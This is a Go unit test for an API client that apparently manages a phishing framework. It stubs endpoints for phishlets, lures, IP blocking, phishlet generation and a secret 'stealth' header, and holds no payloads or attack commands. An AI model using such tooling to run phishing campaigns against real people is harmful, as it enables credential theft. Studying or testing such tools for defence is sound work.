package menu

import (
	"net/http"
	"net/http/httptest"
	"testing"
)

func fakeAPI() *httptest.Server {
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("X-Stealth-Host") != "s3cr3t" {
			w.WriteHeader(404)
			return
		}
		switch r.URL.Path {
		case "/api/v1/stats":
			_, _ = w.Write([]byte(`{"node":"n1","phishlets":2}`))
		case "/api/v1/phishlets":
			_, _ = w.Write([]byte(`["a","b"]`))
		case "/api/v1/block":
			w.WriteHeader(204)
		case "/api/v1/lures":
			w.WriteHeader(201)
		case "/api/v1/phishlets/reload":
			w.WriteHeader(204)
		case "/api/v1/phishlets/generate":
			_, _ = w.Write([]byte("id: g1\n"))
		default:
			w.WriteHeader(404)
		}
	}))
}

func TestClient(t *testing.T) {
	srv := fakeAPI()
	defer srv.Close()
	c := &Client{Base: srv.URL, Stealth: "s3cr3t"}
	st, err := c.Stats()
	if err != nil || st["node"] != "n1" {
		t.Fatalf("stats: %v %v", st, err)
	}
	ph, err := c.Phishlets()
	if err != nil || len(ph) != 2 {
		t.Fatalf("phishlets: %v %v", ph, err)
	}
	if err := c.Block("1.1.1.1", "t"); err != nil {
		t.Fatal(err)
	}
	if err := c.SmartLure("/l/1", "a", 10, 1, "", false); err != nil {
		t.Fatal(err)
	}
	if err := c.Reload(); err != nil {
		t.Fatal(err)
	}
	yml, err := c.Generate("o.com", "p.test", "g1")
	if err != nil || yml != "id: g1\n" {
		t.Fatalf("generate: %q %v", yml, err)
	}
	bad := &Client{Base: srv.URL, Stealth: "wrong"}
	if _, err := bad.Stats(); err == nil {
		t.Fatal("bad stealth must fail decode (404 body)")
	}
}
